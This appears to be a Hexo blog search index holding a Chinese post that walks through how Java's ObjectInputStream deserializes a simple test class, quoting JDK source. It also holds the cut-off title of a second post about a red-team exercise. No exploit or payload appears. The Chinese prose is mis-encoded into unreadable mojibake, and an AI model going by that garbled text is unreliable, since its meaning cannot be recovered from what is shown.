<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–åŸç†</title>
    <link href="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    <url>/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p>è¿™æ˜¯Javaååºåˆ—åŒ–ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ï¼Œä¸»è¦è®°å½•äº†ä¸€èˆ¬æ€§çš„Javaååºåˆ—åŒ–è¿‡ç¨‹ã€‚è¿™ç¯‡æ–‡ç« æ˜¯åœ¨åƒå²›æ¹–ä¸Šå®Œæˆçš„ï¼Œå››é¢ç¯æ¹–ç¡®å®æ›´åŠ å®¹æ˜“è®©äººé™å¿ƒã€‚</p><h1 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">testClass</span> <span class="hljs-variable">demo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">testClass</span>();<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        os.writeObject(demo);<br>        os.close();<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-type">testClass</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> (testClass) ois.readObject();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">testClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String flag;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">testClass</span><span class="hljs-params">()</span>&#123;<br>        flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>test.ser</p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled.png"></p><h1 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h1><h2 id="ObjectInputStreamæ„é€ å‡½æ•°"><a href="#ObjectInputStreamæ„é€ å‡½æ•°" class="headerlink" title="ObjectInputStreamæ„é€ å‡½æ•°"></a>ObjectInputStreamæ„é€ å‡½æ•°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        verifySubclass();<br>        bin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockDataInputStream</span>(in);<br>        handles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandleTable</span>(<span class="hljs-number">10</span>);<br>        vlist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidationList</span>();<br>        serialFilter = ObjectInputFilter.Config.getSerialFilter();<br>        enableOverride = <span class="hljs-literal">false</span>;<br>        readStreamHeader();<br>        bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-comment">// verifySubclass() æŸ¥çœ‹æ˜¯å¦å¯ä»¥åœ¨ä¸è¿åå®‰å…¨çº¦æŸçš„æƒ…å†µä¸‹æ„é€ æ­¤å®ä¾‹</span><br><span class="hljs-comment">// bin è¯»å–å—æ•°æ®</span><br><span class="hljs-comment">// handles æ˜¯ä¸€ä¸ªè½»é‡çš„hashè¡¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯ç¼“å­˜å†™è¿‡çš„å…±äº«classä¾¿äºä¸‹æ¬¡æŸ¥æ‰¾ï¼Œå†…éƒ¨å«æœ‰3ä¸ªæ•°ç»„ï¼Œspineã€nextå’Œobjsã€‚objså­˜å‚¨çš„æ˜¯å¯¹è±¡ä¹Ÿå°±æ˜¯classï¼Œspineæ˜¯hashæ¡¶ï¼Œnextæ˜¯å†²çªé“¾è¡¨ï¼Œä½¿ç”¨assignæ¥æ·»åŠ </span><br><span class="hljs-comment">// vist æ˜¯ä¸€ä¸ªç”¨æ¥æä¾›CallBackæ“ä½œçš„éªŒè¯é›†åˆ</span><br></code></pre></td></tr></table></figure><h2 id="readObjectå‡½æ•°"><a href="#readObjectå‡½æ•°" class="headerlink" title="readObjectå‡½æ•°"></a>readObjectå‡½æ•°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">readObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-keyword">if</span> (enableOverride) &#123;<br>        <span class="hljs-keyword">return</span> readObjectOverride();<br>    &#125;<br><br>    <span class="hljs-comment">// if nested read, passHandle contains handle of enclosing object</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">outerHandle</span> <span class="hljs-operator">=</span> passHandle;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> readObject0(<span class="hljs-literal">false</span>);<br>        handles.markDependency(outerHandle, passHandle);<br>        <span class="hljs-type">ClassNotFoundException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> handles.lookupException(passHandle);<br>        <span class="hljs-keyword">if</span> (ex != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) &#123;<br>            vlist.doCallbacks();<br>        &#125;<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        passHandle = outerHandle;<br>        <span class="hljs-keyword">if</span> (closed &amp;&amp; depth == <span class="hljs-number">0</span>) &#123;<br>            clear();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="readObject0å‡½æ•°"><a href="#readObject0å‡½æ•°" class="headerlink" title="readObject0å‡½æ•°"></a>readObject0å‡½æ•°</h2><p>å…ˆåˆ¤æ–­<code>oldMode</code>çš„å€¼</p><p>é€‰æ‹©*<code>TC_OBJECT</code>*è¿›å…¥<code>checkResolve</code>çš„<code>readOrdinaryObject</code></p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled%201.png"></p><h2 id="readOrdinaryObject"><a href="#readOrdinaryObject" class="headerlink" title="readOrdinaryObject"></a>readOrdinaryObject</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readOrdinaryObject</span><span class="hljs-params">(<span class="hljs-type">boolean</span> unshared)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>();<br>        &#125;<br><span class="hljs-comment">//ä½¿ç”¨ Class.forName ç”Ÿæˆ testClas ç±»çš„æè¿°ç¬¦</span><br>        <span class="hljs-type">ObjectStreamClass</span> <span class="hljs-variable">desc</span> <span class="hljs-operator">=</span> readClassDesc(<span class="hljs-literal">false</span>);<br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å¯ä»¥ååºåˆ—åŒ–</span><br>        desc.checkDeserialize();<br><br><span class="hljs-comment">// ä½¿ç”¨ forClass ç”Ÿæˆæè¿°ç¬¦è¡¨ç¤ºçš„ç±»å®ä¾‹ï¼Œå½“ä¸å­˜åœ¨æœ¬åœ°ç±»æ—¶ä¼šè¾“å‡ºnull</span><br>        Class&lt;?&gt; cl = desc.forClass();<br>        <span class="hljs-keyword">if</span> (cl == String.class || cl == Class.class<br>                || cl == ObjectStreamClass.class) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;invalid class descriptor&quot;</span>);<br>        &#125;<br><br>        Object obj;<br>        <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// åˆ›å»º testClass çš„å®ä¾‹</span><br>            obj = desc.isInstantiable() ? desc.newInstance() : <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            <span class="hljs-keyword">throw</span> (IOException) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<br>                desc.forClass().getName(),<br>                <span class="hljs-string">&quot;unable to create instance&quot;</span>).initCause(ex);<br>        &#125;<br><br>        passHandle = handles.assign(unshared ? unsharedMarker : obj);<br>        <span class="hljs-type">ClassNotFoundException</span> <span class="hljs-variable">resolveEx</span> <span class="hljs-operator">=</span> desc.getResolveException();<br>        <span class="hljs-keyword">if</span> (resolveEx != <span class="hljs-literal">null</span>) &#123;<br>            handles.markException(passHandle, resolveEx);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (desc.isExternalizable()) &#123;<br>            readExternalData((Externalizable) obj, desc);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            readSerialData(obj, desc);<br>        &#125;<br><br>        handles.finish(passHandle);<br><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span> &amp;&amp;<br>            handles.lookupException(passHandle) == <span class="hljs-literal">null</span> &amp;&amp;<br>            desc.hasReadResolveMethod())<br>        &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">rep</span> <span class="hljs-operator">=</span> desc.invokeReadResolve(obj);<br>            <span class="hljs-keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;<br>                rep = cloneArray(rep);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (rep != obj) &#123;<br>                <span class="hljs-comment">// Filter the replacement object</span><br>                <span class="hljs-keyword">if</span> (rep != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (rep.getClass().isArray()) &#123;<br>                        filterCheck(rep.getClass(), Array.getLength(rep));<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        filterCheck(rep.getClass(), -<span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br>                handles.setObject(passHandle, obj = rep);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br></code></pre></td></tr></table></figure><p> <code>readClassDesc</code>å‡½æ•°</p><p>é€šè¿‡è¯»å–test.serä¸­çš„æ ‡è¯†ç¬¦ï¼ŒåŒ¹é…åˆ°*<code>TC_CLASSDESC</code>*å†è¿›å…¥<code>resolveClass</code>å‡½æ•°</p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled%202.png"></p><p>ä½¿ç”¨<code>Class.forName</code>ç”Ÿæˆ<code>testClass</code>ç±»çš„æè¿°ç¬¦</p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled%203.png"></p><p>å…·ä½“çš„è°ƒç”¨é“¾</p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled%204.png"></p><h1 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readSerialData</span><span class="hljs-params">(Object obj, ObjectStreamClass desc)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>  ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; slots.length; i++) &#123;<br>    <span class="hljs-type">ObjectStreamClass</span> <span class="hljs-variable">slotDesc</span> <span class="hljs-operator">=</span> slots[i].desc;<br><br>    <span class="hljs-keyword">if</span> (slots[i].hasData) &#123;<br>        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span> || handles.lookupException(passHandle) != <span class="hljs-literal">null</span>) &#123;<br>            defaultReadFields(<span class="hljs-literal">null</span>, slotDesc); <span class="hljs-comment">// skip field values</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<br>            <span class="hljs-type">ThreadDeath</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">reset</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-type">SerialCallbackContext</span> <span class="hljs-variable">oldContext</span> <span class="hljs-operator">=</span> curContext;<br>            <span class="hljs-keyword">if</span> (oldContext != <span class="hljs-literal">null</span>)<br>                oldContext.check();<br>            <span class="hljs-keyword">try</span> &#123;<br>                curContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerialCallbackContext</span>(obj, slotDesc);<br><br>                bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>                slotDesc.invokeReadObject(obj, <span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                 * In most cases, the handle table has already</span><br><span class="hljs-comment">                 * propagated a CNFException to passHandle at this</span><br><span class="hljs-comment">                 * point; this mark call is included to address cases</span><br><span class="hljs-comment">                 * where the custom readObject method has cons&#x27;ed and</span><br><span class="hljs-comment">                 * thrown a new CNFException of its own.</span><br><span class="hljs-comment">                 */</span><br>                handles.markException(passHandle, ex);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        curContext.setUsed();<br>                        <span class="hljs-keyword">if</span> (oldContext!= <span class="hljs-literal">null</span>)<br>                            oldContext.check();<br>                        curContext = oldContext;<br>                        reset = <span class="hljs-literal">true</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (ThreadDeath x) &#123;<br>                        t = x;  <span class="hljs-comment">// defer until reset is true</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">while</span> (!reset);<br>                <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">throw</span> t;<br>            &#125;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * defaultDataEnd may have been set indirectly by custom</span><br><span class="hljs-comment">             * readObject() method when calling defaultReadObject() or</span><br><span class="hljs-comment">             * readFields(); clear it to restore normal read behavior.</span><br><span class="hljs-comment">             */</span><br>            defaultDataEnd = <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            defaultReadFields(obj, slotDesc);<br>            &#125;<br><br>        <span class="hljs-keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;<br>            skipCustomData();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            bin.setBlockDataMode(<span class="hljs-literal">false</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span> &amp;&amp;<br>            slotDesc.hasReadObjectNoDataMethod() &amp;&amp;<br>            handles.lookupException(passHandle) == <span class="hljs-literal">null</span>)<br>        &#123;<br>            slotDesc.invokeReadObjectNoData(obj);<br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ååºåˆ—åŒ–çš„ç±»æ²¡æœ‰é‡å†™<code>resolveClass</code>å‡½æ•°å’Œ<code>readObject</code>å‡½æ•°æ—¶ï¼Œå°±ä¼šä½¿ç”¨<code>defaultReadFields</code>å‡½æ•°å¯¹å®ä¾‹åŒ–çš„objè¿›è¡Œèµ‹å€¼</p><h3 id="defaultReadFields"><a href="#defaultReadFields" class="headerlink" title="defaultReadFields"></a>defaultReadFields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defaultReadFields</span><span class="hljs-params">(Object obj, ObjectStreamClass desc)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        Class&lt;?&gt; cl = desc.forClass();<br>        <span class="hljs-keyword">if</span> (cl != <span class="hljs-literal">null</span> &amp;&amp; obj != <span class="hljs-literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassCastException</span>();<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">primDataSize</span> <span class="hljs-operator">=</span> desc.getPrimDataSize();<br>        <span class="hljs-keyword">if</span> (primVals == <span class="hljs-literal">null</span> || primVals.length &lt; primDataSize) &#123;<br>            primVals = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[primDataSize];<br>        &#125;<br>            bin.readFully(primVals, <span class="hljs-number">0</span>, primDataSize, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>            desc.setPrimFieldValues(obj, primVals);<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">objHandle</span> <span class="hljs-operator">=</span> passHandle;<br>        ObjectStreamField[] fields = desc.getFields(<span class="hljs-literal">false</span>);<br>        Object[] objVals = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[desc.getNumObjFields()];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">numPrimFields</span> <span class="hljs-operator">=</span> fields.length - objVals.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; objVals.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[numPrimFields + i];<br>            objVals[i] = readObject0(f.isUnshared());<br>            <span class="hljs-keyword">if</span> (f.getField() != <span class="hljs-literal">null</span>) &#123;<br>                handles.markDependency(objHandle, passHandle);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>            desc.setObjFieldValues(obj, objVals);<br>        &#125;<br>        passHandle = objHandle;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦è¦çš„é€»è¾‘æ˜¯è¿™éƒ¨åˆ†ï¼Œä½¿ç”¨<code>readObject0</code>å¯¹ç±»ä¸­çš„æ¯ä¸ªå‚æ•°çš„å€¼è¿›è¡Œè¯»å–èµ‹å€¼ã€‚</p><p><img src="/2023/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/Untitled%205.png"></p><p>å½“æ‰€æœ‰çš„å‚æ•°è¢«è¯»å–å®Œæˆæ—¶ï¼Œå°±å®Œæˆäº†ååºåˆ—åŒ–ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åœ¨Javaååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæœ€ä¸»è¦çš„å‡½æ•°æ˜¯readOrdinaryObjectå‡½æ•°å’ŒreadSerialDataå‡½æ•°ï¼ŒreadOrdinaryObjectå‡½æ•°ä¸»è¦è´Ÿè´£å®ä¾‹åŒ–æœªèµ‹å€¼çš„ç±»å’Œé€‰æ‹©å¯¹åº”çš„å‚æ•°å€¼è¯»å–æ–¹æ³•ï¼ŒreadSerialDataå‡½æ•°æ˜¯Javaé»˜è®¤çš„å‚æ•°å€¼è¯»å–å‡½æ•°ï¼ŒåŒæ—¶ç”±äºå‚æ•°çš„å€¼ä¹Ÿæ˜¯åºåˆ—åŒ–åå­˜å‚¨çš„ï¼Œæ‰€ä»¥åœ¨readSerialDataå‡½æ•°ä¸­é€šè¿‡è°ƒç”¨readObject0å‡½æ•°çš„æ–¹æ³•ï¼Œå®ç°æ•´ä¸ªååºåˆ—åŒ–çš„å‚æ•°è¯»å–æµç¨‹ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/">https://fynch3r.github.io/Javaååºåˆ—åŒ–æµç¨‹æ¢³ç†/</a><br><a href="https://developer.aliyun.com/article/643797">https://developer.aliyun.com/article/643797</a><br><a href="https://www.cnblogs.com/nice0e3/p/14127885.html#0x02-shiro-resolveclass%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90">https://www.cnblogs.com/nice0e3/p/14127885.html#0x02-shiro-resolveclassæ–¹æ³•åˆ†æ</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022.11æŸHVVå°è®°â€”â€”å¼±å£ä»¤YYDS</title>
    <link href="/2023/01/29/2022-11HW%E5%B0%8F%E8%AE%B0/"/>
    <url>/2023/01/29/2022-11HW%E5%B0%8F%E8%AE%B0/</url>
    
